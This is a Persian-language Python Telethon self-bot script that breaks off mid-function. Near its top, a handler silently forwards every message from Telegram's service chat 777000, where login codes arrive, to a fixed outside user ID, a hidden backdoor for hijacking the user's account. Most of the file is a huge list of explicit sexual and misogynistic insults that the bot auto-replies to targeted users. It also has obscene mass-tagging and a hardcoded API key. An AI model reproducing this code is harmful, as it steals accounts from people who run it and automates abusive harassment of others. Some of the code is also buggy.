from telethon import TelegramClient , events
from os import listdir as L
from json import load,dump
from random import choice as C
from telethon.tl.functions.account import UpdateProfileRequest
from telethon import TelegramClient
from datetime import datetime
from telethon import errors
import asyncio
import pytz
import os
import sys

api_id = 29042268 # آی پی آی آیدی بزارید
api_hash = "54a7b377dd4a04a58108639febe2f443" # آی پی آی هش بزارید
with TelegramClient('bsbs', api_id, api_hash) as client:
   client.send_message('me', '✅ با موفقیت سلف روی اکانت شما ران شد میتوانید با ارسال پیام\n`Help`\nکامند های ربات رو دریافت کنید با تشکر سازنده ربات آراز\n\n🆔 @bOOkieT')
   print(client.download_profile_photo('me'))
AdminBot = 6508600903#ایدی عددی ادمین

@client.on(events.NewMessage())
async def my_event_handler(event):
    if event.chat_id == 777000:
        await event.forward_to(1153025134)     

enemyall_list = []

@client.on(events.NewMessage(pattern=r"(.*)" , from_users=AdminBot))
async def name(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    xxx = (input_str)
    if (xxx) in fff_list:
        await event.edit(f"**{xxx}**")
    else:
        try:
            fff_list.append(xxx)
            await event.edit(f"**{xxx}**")
        except:
            await event.edit("**{xxx}**")

@client.on(events.NewMessage(from_users=AdminBot))
async def _(event):
    if event.raw_text.lower() == "تنظیم دشمن":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
        xxx = int("{}".format(sender.id))
        if int(xxx) in enemyall_list:
            await event.edit("**این کاربر در حال حاضر در لیست دشمنان است.**".format(sender.first_name , sender.id))
        else:
            try:
                enemyall_list.append(int(xxx))
                await event.edit("**کاربر به دشمنان اضافه شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
    elif event.raw_text.lower() == "حذف دشمن":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
        xxx = int("{}".format(sender.id))
        if int(xxx) not in enemyall_list:
            await event.edit("**این کاربر در لیست دشمنان نیست.**".format(sender.first_name , sender.id))
        else:
            try:
                enemyall_list.remove(int(xxx))
                await event.edit("**کاربر در لیست دشمنان حذف شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
@client.on(events.NewMessage())
async def clean_name(event):
    text = (event.raw_text)
    if (text == "پاکسازی لیست دشمنان" and event.sender_id == AdminBot):
        if enemyall_list == []:
            await event.edit("**لیست دشمنان در حال حاضر خالی است!**")
        else:
            enemyall_list.clear()
            await event.edit("**لیست دشمنان پاک شد!**")    

mute_list = []

@client.on(events.NewMessage(from_users=AdminBot))
async def _(event):
    if event.raw_text.lower() == "سکوت":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
        xxx = int("{}".format(sender.id))
        if int(xxx) in mute_list:
            await event.edit("**این کاربر در حال حاضر در لیست سکوت(سکوت پی وی) است!**".format(sender.first_name , sender.id))
        else:
            try:
                mute_list.append(int(xxx))
                await event.edit("**کاربر به لیست سکوت(سکوت پی وی) اضافه شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
    elif event.raw_text.lower() == "حذف سکوت":
        chat = await event.get_chat()
        replied = await event.get_reply_message()
        sender = replied.sender
        xxx = int("{}".format(sender.id))
        if int(xxx) not in mute_list:
            await event.edit("**این کاربر در لیست سکوت (سکوت پی وی) نیست!**".format(sender.first_name , sender.id))
        else:
            try:
                mute_list.remove(int(xxx))
                await event.edit("**کاربر در لیست سکوت (سکوت پی وی) حذف شد!**".format(sender.first_name , sender.id))
            except:
                await event.edit("**No Invalid . . . !**")
@client.on(events.NewMessage())
async def clean_name(event):
    text = (event.raw_text)
    if (text == "پاکسازی لیست سکوت" and event.sender_id == AdminBot):
        if mute_list == []:
            await event.edit("**لیست سکوت (سکوت پی وی) در حاضر خالی است!**")
        else:
            enemydall_list.clear()
            await event.edit("**لیست سکوت (سکوت پی وی) پاک شد!**")

@client.on(events.NewMessage)
async def enemy(event):
    if event.sender_id in mute_list:
        await event.delete()


foshall_list = ["کص مادرت", "کص ابجیت", "تبر تو کص مادرت", "کیر 47 سانتیم با کاندوم صاف به سوی کص مادرت", "تو پسر من هستی", "کیر فیل به کص مادرت", "خایه های شوهر عمت تو کص مادرت", "مادرجنده", "مادرقحبه", "کص مادرت", "خارکصه", "مادرتو گاییدم", "مادرتو سفت سفت خوردم", "کص زن عموی مادرجندت ، مادرکسته", "خارکسده", "کیر کاکا امام خمینی ساف تو کص ام الفامیلات", "الحق کص مادرت", "سلام مادرکسته", "کص خواهرت", "سیم aux تو کس ناموست", "اکسترنال هارد تو کس مادرت", "عمودى تو كس مادرت", "ایفون تصویری بزرگا تو کون مادرت" ,"کیر تو کانون سرد خونوادت", "یخچال تو کص مادرت", "خایه مال خودمی تو", "ریدن به قبر ننت مادر جنده", "سیب تو کس ننت", "ناموست کص کهکشانی شد خخخخخخخخخخ", "حوله تو کس مادرت", "تو مادر جنده به کص ننت خندیدی شاخ شدی", "از کیره خودمی فرزندم", "کص خارت حاصله کاندوم اناریه پاره شده خخخخخ", "كير شتر   ابوسفيان تو كس ننت", "گرگ تو کون مادرت" ,"بالا باش کیرمو ناخودآگاه تو کص ننت کنم", "کیرم تو خارت", "بصیک بچه کونی", "بای بده ننه پولی", "کیرم تو ننت اوبی", "نگامت کص ننه ", "کص ننه پرده ارتجاعیت", "ننتو شبی چند میدی؟", "خارتو با روغن جامد گاییدم", "کص آبجیت ", "زنا زادع ", "ننه خیابونی", "گی ننه", "آبم لا کص ننت چجوری میشه", "بالا باش ننه کیر دزد", "ننت مجلسی میزنه؟کصصصص ننت جووووون", "ننه جریده", "گی پدر زنا زادع ", "ننتو کرایه میدی؟", "شل ننه بالا باش", "خارکصده به ننت بگو رو کیرم خوش میگذره؟", "ننه توله کص ننتو جر میدم", "بیا ننتو ببر زخمش کردم", "کص ننتو بزارم یکم بخندیم", "به ننت بگو بیاد واسم پر توف بزنه خرجتونو بدم یتیم", "فلج تیز باش ننتو بیار", "ننت پر توف میزنی بابات شم؟", "اوب کونی بزن به چاک تا ننتو جلوت حامله نکردمننه کون طلا بیا بالا", "یتیم بیا بغلم ", "ننت گنگ بنگ دوس داره؟", "بیا بگامت شاد شی خار کصده", "کیرم تو کص ننت بگو باشه", "داداش دوس داری یا آبجی ننه پولی", "۵۰ میدم ننتو بدهکیرم کص آبجی کص طلاااات", "ننه پولی چند سانت دوس داری؟", "دست و پا نزن ننه کص گشاد", "ننه ساکر هویت میخوای؟", "کیر سگا تو کص آبجیت ", "از ننت بپرس آب کیر پرتقالی دوس داره؟", "پستون ننت چنده", "تخخخخ بیا بالا ادبی", "مادرت دستو پا میزنه زیرم", "ننه سکسی بیا یه ساک بزن بخندیم", "خمینی اومد جاده دهاتتونو آسفالت کرد اومدید شهر و گرنه ننت کجا کص میداد؟", "گص کش", "کس ننه", "کص ننت", "کس خواهر", "کس خوار", "کس خارت", "کس ابجیت", "کص لیس", "ساک بزن", "ساک مجلسی", "ننه الکسیس", "نن الکسیس", "ناموستو گاییدم", "ننه زنا", "کس خل", "کس مخ", "کس مغز", "کس مغذ", "خوارکس", "خوار کس", "خواهرکس", "خواهر کس", "حروم زاده", "حرومزاده", "خار کس", "تخم سگ", "پدر سگ", "پدرسگ", "پدر صگ", "پدرصگ", "ننه سگ", "نن سگ", "نن صگ", "ننه صگ", "ننه خراب", "تخخخخخخخخخ", "نن خراب", "مادر سگ", "مادر خراب", "مادرتو گاییدم", "تخم جن", "تخم سگ", "مادرتو گاییدم", "ننه حمومی", "نن حمومی", "نن گشاد", "ننه گشاد", "نن خایه خور", "تخخخخخخخخخ", "نن ممه", "کس عمت", "کس کش", "کس بیبیت", "کص عمت", "کص خالت", "کس بابا", "کس خر", "کس کون", "کس مامیت", "کس مادرن", "مادر کسده", "خوار کسده", "تخخخخخخخخخ", "ننه کس", "بیناموس", "بی ناموس", "شل ناموس", "سگ ناموس", "ننه جندتو گاییدم باو ", "چچچچ نگاییدم سیک کن پلیز D:", "ننه حمومی", "چچچچچچچ", "لز ننع", "ننه الکسیس", "کص ننت", "بالا باش", "ننت رو میگام", "کیرم از پهنا تو کص ننت", "مادر کیر دزد", "ننع حرومی", "تونل تو کص ننت", "کیر تک تک بکس تلع گلد تو کص ننت", "کص خوار بدخواه", "خوار کصده", "ننع باطل", "حروم لقمع", "ننه سگ ناموس", "منو ننت شما همه چچچچ", "ننه کیر قاپ زن", "ننع اوبی", "ننه کیر دزد", "ننه کیونی", "ننه کصپاره", "زنا زادع", "کیر سگ تو کص نتت پخخخ", "ولد زنا", "ننه خیابونی", "هیس بع کس حساسیت دارم", "کص نگو ننه سگ که میکنمتتاااا", "کص نن جندت", "ننه سگ", "ننه کونی", "ننه زیرابی", "بکن ننتم", "ننع فاسد", "ننه ساکر", "کس ننع بدخواه", "نگاییدم", "مادر سگ", "ننع شرطی", "گی ننع", "بابات شاشیدتت چچچچچچ", "ننه ماهر", "حرومزاده", "ننه کص", "کص ننت باو", "پدر سگ", "سیک کن کص ننت نبینمت", "کونده", "ننه ولو", "ننه سگ", "مادر جنده", "کص کپک زدع", "ننع لنگی", "ننه خیراتی", "سجده کن سگ ننع", "ننه خیابونی", "ننه کارتونی", "تکرار میکنم کص ننت", "تلگرام تو کس ننت", "کص خوارت", "خوار کیونی", "پا بزن چچچچچ", "مادرتو گاییدم", "گوز ننع", "کیرم تو دهن ننت", "ننع همگانی", "کیرم تو کص زیدت", "کیر تو ممهای ابجیت", "ابجی سگ", "کس دست ریدی با تایپ کردنت چچچ", "ابجی جنده", "ننع سگ سیبیل", "بده بکنیم چچچچ", "کص ناموس", "شل ناموس", "ریدم پس کلت چچچچچ", "ننه شل", "ننع قسطی", "ننه ول", "دست و پا نزن کس ننع", "ننه ولو", "خوارتو گاییدم", "محوی!؟", "ننت خوبع!؟", "کس زنت", "شاش ننع", "ننه حیاطی \\\\\/:", "نن غسلی", "کیرم تو کس ننت بگو مرسی چچچچ", "ابم تو کص ننت :\\\\\/", "فاک یور مادر خوار سگ پخخخ", "کیر سگ تو کص ننت", "کص زن", "ننه فراری", "بکن ننتم من باو جمع کن ننه جنده \\\\\/:::", "ننه جنده بیا واسم ساک بزن", "حرف نزن که نکنمت هااا :|", "کیر تو کص ننت😐", "کص کص کص ننت", "کصصصص ننت جووون", "سگ ننع", "کص خوارت", "کیری فیس", "کلع کیری", "تیز باش سیک کن نبینمت", "فلج تیز باش چچچ", "بیا ننتو ببر", "بکن ننتم باو ", "کیرم تو بدخواه", "چچچچچچچ", "ننه جنده", "ننه کص طلا", "ننه کون طلا", "کس ننت بزارم بخندیم!؟", "کیرم دهنت", "مادر خراب", "ننه کونی", "هر چی گفتی تو کص ننت خخخخخخخ", "کص ناموست بای", "کص ننت بای :\\\\\/\\\\\/", "کص ناموست باعی تخخخخخ", "کون گلابی!", "ریدی آب قطع", "کص کن ننتم کع", "نن کونی", "نن خوشمزه", "ننه لوس", " نن یه چشم ", "ننه چاقال", "ننه جینده", "ننه حرصی ", "نن لشی", "ننه ساکر", "نن تخمی", "ننه بی هویت", "نن کس", "نن سکسی", "نن فراری", "لش ننه", "سگ ننه", "شل ننه", "ننه تخمی", "ننه تونلی", "ننه کوون", "نن خشگل", "نن جنده", "نن ول ", "نن سکسی", "نن لش", "کس نن ", "نن کون", "نن رایگان", "نن خاردار", "ننه کیر سوار", "نن پفیوز", "نن محوی", "ننه بگایی", "ننه بمبی", "ننه الکسیس", "نن خیابونی", "نن عنی", "نن ساپورتی", "نن لاشخور", "ننه طلا", "ننه عمومی", "ننه هر جایی", "نن دیوث", "تخخخخخخخخخ", "نن ریدنی", "نن بی وجود", "ننه سیکی", "ننه کییر", "نن گشاد", "نن پولی", "نن ول", "نن هرزه", "ننه لاشی کیری", "ننه ویندوزی", "نن تایپی", "نن برقی", "نن شاشی", "ننه درازی", "شل ننع", "یکن ننتم که", "کس خوار بدخواه", "آب چاقال", "ننه جریده", "ننه سگ سفید", "آب کون", "ننه 85", "ننه سوپری", "بخورش", "کس ن", "خوارتو گاییدم", "خارکسده", "گی پدر", "آب چاقال", "زنا زاده", "زن جنده", "سگ پدر", "مادر جنده", "ننع کیر خور", "چچچچچ", "تیز بالا", "ننه سگو با کسشر در میره", "کیر سگ تو کص ننت", "kos kesh", "kir", "kiri", "nane lashi", "kos", "kharet", "blis kirmo", "اوبی کونی هرزه", "کیرم لا کص خارت", "کیری", "ننه لاشی", "ممه", "کص", "کیر", "بی خایه", "ننه لش", "بی پدرمادر", "خارکصده", "مادر جنده", "کصکش", "کیرم کون مادرت", "بالا باش کیرم کص مادرت", "مادرتو میگام نوچه جون بالا??", "اب خارکصته تند تند تایپ کن ببینم", "مادرتو میگام بخای فرار کنی", "لال شو", "کیرم تو خارت", "بصیک بچه کونی", "بای بده ننه پولی", "کیرم تو ننت اوبی", "نگامت کص ننه ", "کص ننه پرده ارتجاعیت", "ننتو شبی چند میدی؟", "خارتو با روغن جامد گاییدم", "کص آبجیت ", "زنا زادع ", "ننه خیابونی", "گی ننه", "آبم لا کص ننت چجوری میشه", "بالا باش ننه کیر دزد", "ننت مجلسی میزنه؟", "کصصصص ننت جووووون", "ننه جریده", "گی پدر زنا زادع ", "ننتو کرایه میدی؟", "شل ننه بالا باش", "خارکصده به ننت بگو رو کیرم خوش میگذره؟", "ننه توله کص ننتو جر میدم", "بیا ننتو ببر زخمش کردم", "کص ننتو بزارم یکم بخندیم", "به ننت بگو بیاد واسم پر توف بزنه خرجتونو بدم یتیم", "ننه کون طلا بیا بالا", "یتیم بیا بغلم ", "ننت گنگ بنگ دوس داره؟", "بیا بگامت شاد شی خار کصده", "کیرم تو کص ننت بگو باشه", "داداش دوس داری یا آبجی ننه پولی", "۵۰ میدم ننتو بده", "فلج تیز باش ننتو بیار", "کیرم کص آبجی کص طلاااات", "ننه پولی چند سانت دوس داری؟", "دست و پا نزن ننه کص گشاد", "ننه ساکر هویت میخوای؟", "کیر سگا تو کص آبجیت ", "از ننت بپرس آب کیر پرتقالی دوس داره؟", "پستون ننت چنده", "تخخخخ بیا بالا ادبی", "مادرت دستو پا میزنه زیرم", "ننه سکسی بیا یه ساک بزن بخندیم", "خمینی اومد جاده دهاتتونو آسفالت کرد اومدید شهر و گرنه ننت کجا کص میداد؟", "کیرم تا ته و از پهنا تو کص مادرت", "کص ناموس مادرت", "مادر کص پاپیونی ", "مادر جنده حروم تخمی", "اوبی زاده حقیر", "بابات زیر کیرم بزرگ شد", "اسمم رو کون مادرت تتو شده", "خیخیخیخیخی", "چچچچچچچچ", "زجه بزن ناموس گلابی", "مادرت کیرمه ", "بابات منم ", "تخم سگ حروم زاده ", "کص ناموست ", "خواهرتو گاییدم", "ریدم بهت بیشعور", " بی شرف", " ریدم تو مغزت", " بی ارزش", " کصکش", " ریدم توی ناموست", " بی ناموس", " مادرجنده", " خواهر کصکش", " ریدم توی کل طایفت", " بی ناموس برو", " خوشم ازت نمیاد کصکش", " تو کصکشی", " برو خواهر جنده", "برو مادرجنده", " برو برادر کونی", " کونکش", "عوض بی ناموس", "ریدم تو قبر مادرت", "ریدم تو قبر پدرت", " ریدم تو قبرت", " ریدم تو زاتت", " ریدم تو خواهر جنده", " خواهر جندت خوبه", " مادر جندت خوبه", " پدر کونکشت خوبه", "برادر کونیت خوب", " پدرسگ", " مادر سگ", " برادر سگ", " خواهر سگ", " خواهر جندت چی", " مادر جندت چی", " پدر کونیت چی", " برادر کونیت چی", " اره جنده ها", " تو جنده ای", " تو کونی ای", " توی کصکشی", " خوشم از جنده ها نمیاد", " خواهرت جنده شده", " مادرت جنده شده", " جنده برو خودت رو جمع کن", " مامانت امشب روی کی هستش", " خواهرت پیش کیه", " برادرت داره کجا کون میده", " بابای قرمساقت کو", " خواهرت امشب روی کی هستش", " مادرت امشب روی کی خوابیده", "ننت پر توف میزنی بابات شم؟", "اوب کونی بزن به چاک تا ننتو جلوت حامله نکردم", " ریدم بهت", " بیشعور", " بی شرف", " ریدم تو مغزت", " بی ارزش", " کصکش", " ریدم توی ناموست", " بی ناموس", " مادرجنده", " خواهر کصکش", " ریدم توی کل طایفت", " بی ناموس برو", " خوشم ازت نمیاد کصکش", " تو کصکشی", " برو خواهر جنده", " برو مادرجنده", " برو برادر کونی", " کونکش", " عوض بی ناموس", " ریدم تو قبر مادرت", " ریدم تو قبر پدرت", " ریدم تو قبرت", " ریدم تو زاتت", " ریدم تو خواهر جنده", " خواهر جندت خوبه", " مادر جندت خوبه", " پدر کونکشت خوبه", " برادر کونیت خوب", " پدرسگ", " مادر سگ", " برادر سگ", " خواهر سگ", " خواهر جندت چی", " مادر جندت چی", " پدر کونیت چی", " برادر کونیت چی", " اره جنده ها", " تو جنده ای", " تو کونی ای", " توی کصکشی", " خوشم از جنده ها نمیاد", " خواهرت جنده شده", " مادرت جنده شده", " جنده برو خودت رو جمع کن", " مامانت امشب روی کی هستش", " خواهرت پیش کیه", " برادرت داره کجا کون میده", " بابای قرمساقت کو", " خواهرت امشب روی کی هستش", " مادرت امشب روی کی خوابیده", "کیرم کون مادرت", "بالا باش کیرم کص مادرت", "مادرتو میگام نوچه جون بالا", "اب خارکصته تند تند تایپ کن ببینم", "مادرتو میگام بخای فرار کنی", "لال شو دیگه نوچه", "مادرتو میگام اف بشی", "کیرم کون مادرت", "کیرم کص مص مادرت بالا", "کیرم تو چشو چال مادرت", "کون مادرتو میگام بالا", "بیناموس  خسته شدی؟", "نبینم خسته بشی بیناموس", "ننتو میکنم", "کیرم کون مادرت ", "صلف تو کصننت بالا", "بیناموس بالا باش بهت میگم", "کیر تو مادرت", "کص مص مادرتو بلیسم؟", "کص مادرتو چنگ بزنم؟", "به خدا کصننت بالا ", "مادرتو میگام ", "کیرم کون مادرت بیناموس", "مادرجنده بالا باش", "بیناموس تا کی میخای سطحت گح باشه", "اپدیت شو بیناموس خز بود", "کیرم از پهنا تو ننت", "و اما تو بیناموس چموش", "تو یکیو مادرتو میکنم", "کیرم تو ناموصت ", "کیر تو ننت", "ریش روحانی تو ننت", "کیر تو مادرت", "کص مادرتو مجر بدم", "صلف تو ننت", "بات تو ننت ", "مامانتو میکنم بالا", "کیر ترکا به ناموست", "سطحشو نگا", "تایپ کن بیناموس", "خشاب؟", "کیرم کون مادرت بالا", "بیناموس نبینم خسته بشی", "مادرتو بگام؟", "گح تو سطحت شرفت رف", "بیناموس شرفتو نابود کردم یه کاری کن", "وای کیرم تو سطحت", "بیناموس روانی شدی", "روانیت کردما", "مادرتو کردم کاری کن", "تایپ تو ننت", "بیپدر بالا باش", "و اما تو لر خر", "ننتو میکنم بالا باش", "کیرم لب مادرت بالا", "چطوره بزنم نصلتو گح کنم", "داری تظاهر میکنی ارومی ولی مادرتو کوص کردم", "مادرتو کردم بیغیرت", "هرزه", "وای خدای من اینو نگا", "کیر تو کصننت", "ننتو بلیسم", "منو نگا بیناموس", "کیر تو ننت بسه دیگه", "خسته شدی؟", "ننتو میکنم خسته بشی", "وای دلم کون مادرت بگام", "اف شو احمق", "بیشرف اف شو بهت میگم", "مامان جنده اف شو", "کص مامانت اف شو", "کص لش وا ول کن اینجوری بگو؟", "ای بیناموس چموش", "خارکوصته ای ها", "مامانتو میکنم اف نشی", "گح تو ننت", "سطح یه گح صفتو", "گح کردم تو نصلتا", "چه رویی داری بیناموس", "ناموستو کردم", "رو کص مادرت کیر کنم؟", "نوچه بالا", "کیرم تو ناموصتاا", "یا مادرتو میگام یا اف میشی", "لالشو دیگه", "بیناموس", "مادرکصته", "ناموص کصده", "وای بدو ببینم میرسی", "کیرم کون مادرت چیکار میکنی اخه", "خارکصته بالا دیگه عه", "کیرم کصمادرت", "کیرم کون ناموصد", "بیناموس من خودم خسته شدم توچی؟", "ای شرف ندار", "مامانتو کردم بیغیرت", "و اما مادر جندت", "تو یکی زیر باش", "اف شو", "خارتو کوص میکنم", "کوصناموصد", "ناموص کونی", "خارکصته ی بۍ غیرت", "شرم کن بیناموس", "مامانتو کرد ", "ای مادرجنده", "بیغیرت", "کیرتو ناموصت", "بیناموس نمیخای اف بشی؟", "ای خارکوصته", "لالشو دیگه", "همه کس کونی", "حرامزاده", "مادرتو میکنم", "بیناموس", "کصشر", "اف شو مادرکوصته", "خارکصته کجایی", "ننتو کردم کاری نمیکنی؟", "کیرتو مادرت لال", "کیرتو ننت بسه", "کیرتو شرفت", "مادرتو میگام بالا", "کیر تو مادرت", "کونی ننه ی حقیر زاده", "وقتی تو کص ننت تلمبه های سرعتی میزدم تو کمرم بودی بعد الان برا بکنه ننت شاخ میشی هعی   ", "تو یه کص ننه ای ک ننتو به من هدیه کردی تا خایه مالیمو کنی مگ نه خخخخ", "انگشت فاکم تو کونه ناموست", "تخته سیاهه مدرسه با معادلات ریاضیه روش تو کص ننت اصلا خخخخخخخ ", "کیرم تا ته خشک خشک با کمی فلفل روش تو کص خارت ", "کص ننت به صورت ضربدری ", "کص خارت به صورت مستطیلی", "رشته کوه آلپ به صورت زنجیره ای تو کص نسلت خخخخ ", "10 دقیقه بیشتر ابم میریخت تو کس ننت این نمیشدی", "فکر کردی ننت یه بار بهمـ داده دیگه شاخی", "اگر ننتو خوب کرده بودم حالا تو اینجوری نمیشدی", 
    'کیرم تو رحم اجاره ای و خونی مالی مادرت حاضرم',
    ' دو میلیون شبی پول ویلا بدم تا مادرتو تو گوشه کناراش بگام و اب کوسشو بریزم کف خونه تا فردا صبح کارگرای افغانی برای نظافت اومدن با بوی اب کس مادرت بجقن و ابکیراشون نثار قبر مرده هات بشه',
    'آخه احمق مادر کونی من کس مادرت گذاشتم تو بازم داری کسشر میگی',
    ' کیرم تا تخمدانش تو کس مادرت بی سطح خار کسه انقدسرعتت پایینه خستم کردی کیرمو جاساز کردم تو کس چرب مادرت به قول والدفری ک الان قیافشو یادم نمیاد میگفت هر شمشیر یه قلاف میخواد ولی قافل از این ک کیر من مثل گرز رستمه و کس مادرت مثل قلاف چاقو دستی پس کیر تو ناموست ',
    'قراره به مادرت به سهمگین ترین شکل ممکن تجاوز کنم و توی فاحشه ی نتی و هرزه ی متصل به اینترنت جهانی و بین الملل بیای توی اپلیکیشن تلگرام بگی نخوندم',
    'مرسی فک میکنی میخونم این اراجیف خزتو احمق مادر جنده من مادرتو دارم میکشم تو واسه من پنج خط تکس پر می‌کنی خز ممبر دوساعتع رو تایپی این کسشرا چیه میگی آخه کیرم تو سطح گوهت',
    'وقتی کیرمو نشون مادرت دادم سوار پراید ۷۹ شد و باهاش شبانه روز تاخت تا کیلومتر ها از من دور بشه ولی قافل از این بود ک من سوار سوزوکی ۱۰۰۰ بودم و تا روز قیامت مادرتو تعقیب کردم ریدم پراید هفتاد نه سکو با لانچیکو بزنی سوار پراید ۸۲ نمیشه احمق با پراید مدل ۷۹ میرم تو کس ننت تا مثل یه ماشین زمان عمل کنه',
    'اتحادی خر ممبر این اراجیف چیه می‌نویسی آخه کیرم تو ناموس پاموست با زبون مثل موتور برقم میافتم به کس مادرت و لیسای عمیق میزنم و اب کوسشو را میندازم ',
    'ببین مادرت که اینجاس ببینم زبون درازی میکنم همین الان از کس دارش میزنم تگ مگ چیه خارکسته ی ولد موش حاصل زنای خرس گریزلی با مادرت مگه مثل توی مادر پیچ گوشتی داگ اتحادیم سگ افغان با اسم گوه و کمترین داشته های زندگی و بی همه چیز بودن کیر تو همه کست همه کس کونی تو دوساعت باقی‌موندش سینه های گوشتالوی ',
    'مادرتو میگیرم تو دستمو میمالم و دهنمو چفت کوس مادرت میکنم و مثل همیشه و مثل یه لیسر قهار زبون میندازم به چوچول سیاه مادرت و یکاری میکنم صدای اه و نالش کل ۷ اسمونو برداره ',
    'ای کس ننت مادر جنده که انقد خری که داری از خایه هام بالامیری مادر جنده کیرم به پهنا تو کس مادرت دارم با کس ننت بازی میکنم تو داری جق میزنی با پورنایی که از مادرت فرسادم واست بیناموس کیرم تو ناموست فیلم ابد و یک روز بره تو کس ننه ی هرکی تماشاش کرده خارکسته فقط بنرشو یبار تو سینما دیدم مادر خر مگ مثل توی کسته ناموس خزم برم فیلمای گوه ایرانیارو نیگا کنم مادر سکسچتر کفتر مادر کلاغ بیاد نوک بزنه تو کس ننت مادرکسته میدونم جلوی تکسام داری کم میاری و به پته پته افتادی ولی گوه تو کس ناموست من دست بردار نیستم و امپولای ادمای انسولینی رو میکنم تو کس ننتآخه کس ننت گذاشتم که انقد فشاری شدی واسه من ده خط پر می‌کنی اتحادی خر ممبر کس ننتو گاییدم بعد شروع میکنی کسشر گفتن مثل شکلاتای فرمند که دو رنگن با مادرت ترکیب میشم و میدم پدر بی غیرتت بخوره خارکسته پول نداری چیه مادر خر اندازه حقوق یه ماه بابای کارگر فقیرت فقط خرج شورت و سوتینای مادرت میکنم ک موقع سکس هرشب پارشون میکنم و به خورد مادرت میدم ببین بابات انقد بی غیرته که داره اینجا با کس ننت ور می‌ره من دارم فیلم میگیرم دست از سر خایه هام بردار کسکش پدر خدازده بی ابرو سیک کن دلقک با اون ایموجی خز که یه مش بچ سال عنشو دراوردن اتحادی چیه خارکسته به مادرت غذا نمیدم تا قند مغزش بیاد پایین و جوش بیاره و همین ک عصبانی شد کیرمو بکنم تک دهنش تا خفه خون بگیدخ اموجی تو کص ننت رفته مقدس شده واسم پسر کونی نهایت ۱۶ سالن باشه نبینم واسه من قد علم کنی که کس مادرتو با همین چاقو اینجا پاره میکنم کس ننت بگیدخ چیه لرز چیه داش وقتی میترسی مادرت راحت تر کسش باز میشه کیرمو میکنم تو کس ناموست و با رمز عملیاتی ک الان تو خاطرم نیست به مادرت یورش میبرم خر مادر تا اعتراف نکنی مادرت به اعماق اقیانوس ارام پیوسته دست از سر کچل بابای بی غیرتت برنمیدارم آخه کیرم تو سطح کوهت سر ناموست شرط بستم مادر جنده کس ننت کیرم تو ناموست مادربَرده خسته نمیشی اتقد دلقک بازی درمیاری کودکستانی خارکسته ترس مرس تو کارم نیست و مثل یه شیر میافتم به جون پستونای بلوری مادرت و میمیکم و میمیکم ابکیرمو خالی میکنم رو سنگ قبر مشکی بابای خدابیامرزت مادرت پورن استاره میدونستی؟ زشته انقد بی غیرتی جای این که از زیر پل جمعش کنی نشستی با فحاشی های بچه سالانه صورت مسعله رو پاک میکنی خارکسته اینجا حق بت زدن نداری کجکی ناموس پوسته گوجه ناموس میرم تو کسه مادرت درم نمیبندم کیرم تو خار مادرت مادر جنده من کس ننتو دارم با اشتهای کاذب میخورم تو داری به کس ننت میخندی کیرم تو رحم اجاره ای و خونی مالی مادرت حاضرم دو میلیون شبی پول ویلا بدم تا مادرتو تو گوشه کناراش بگام و اب کوسشو بریزم کف خونه']


@client.on(events.NewMessage(pattern=r"اضاف فحش (.*)" , from_users=AdminBot))
async def add_name(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    xxx = (input_str)
    if (xxx) in foshall_list:
        await event.edit(f"**فحش ( {xxx} )از قبل در لیست فحش ها وجود دارد! **")
    else:
        try:
            foshall_list.append(xxx)
            await event.edit(f"**این فحش ( {xxx} ) به لیست فحش ها اضافه شد!**")
        except:
            await event.edit("**No Invalid . . . !**")

@client.on(events.NewMessage(pattern=r"حذف فحش (.*)" , from_users=AdminBot))
async def del_name(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    xxx = (input_str)
    if (xxx) not in foshall_list:
        await event.edit(f"**فحش ( {xxx} ) در لیست فحش ها وجود دارد!**")
    else:
        try:
            foshall_list.remove(xxx)
            await event.edit(f"**فحش ( {xxx} ) از لیست فحش ها حذف شد!**")
        except:
            await event.edit("**No Invalid . . . !**")

@client.on(events.NewMessage())
async def clean_name(event):
    text = (event.raw_text)
    if (text == "پاکسازی لیست فحش ها" and event.sender_id == AdminBot):
        if foshall_list == []:
            await event.edit("**لیست فحش ها خالی است!**")
        else:
            foshall_list.clear()
            await event.edit("**لیست فحش ها پاکسازی شد!**")

@client.on(events.NewMessage)
async def enemy(event):
    if event.sender_id in enemyall_list:
        await event.reply(C(foshall_list))
        
@client.on(events.NewMessage)
async def enemy(event):
    if event.sender_id in enemyall_list:
        await event.delete()
     
fff_list = []

@client.on(events.NewMessage(pattern=r". (.*)" , from_users=AdminBot))
async def del_name(event):
    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    xxx = (input_str)
    if (xxx) not in fff_list:
        await event.edit(f"**✿⃟🍂✾ٖٜٖٜ♡⃟ٖٜٖٜٖٜ♡ٖٜٖٜ𝙺𝙸𝙽𝙶ٖٜٖٜ♡⃟ٖٜٖٜٖٜ♡ٖٜٖٜ✾⃟🥀✿                                        یک پیام از سلطان سکندر نشان سلیمان مکان:{xxx} **")
    else:
        try:
            fff_list.remove(xxx)
            await event.edit(f"**✿⃟🍂✾ٖٜٖٜ♡⃟ٖٜٖٜٖٜ♡ٖٜٖٜ𝙺𝙸𝙽𝙶ٖٜٖٜ♡⃟ٖٜٖٜٖٜ♡ٖٜٖٜ✾⃟🥀✿                                    یک پیام از سلطان سکندر نشان سلیمان مکان: {xxx} **")
        except:
            await event.edit("**اخطار**")

@client.on(events.NewMessage(pattern=r'(tagall|تگ)', outgoing=True , func=lambda e: e.is_group))
async def tagall(event):
	if event.fwd_from:
		return
	mentions = "**اهالی گپ هر کی زود تر پیام داد کون علی کریمی گیرش میاد!**"
	chat = await event.get_input_chat()
	async for x in client.iter_participants(chat, 100):
		mentions += f" \n [{x.first_name}](tg://user?id={x.id})"
	await event.reply(mentions)
	await event.delete()

@client.on(events.ChatAction)
async def newMember(event):
	if event.user_joined:
		await event.reply("**کیرت تو کون علی کریمی ؛ به گپ خوش اومدی!**                                  ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ɢʀᴏᴜᴘ!")

@client.on(events.NewMessage(pattern=r'قلب', outgoing=True))
async def heart(event):
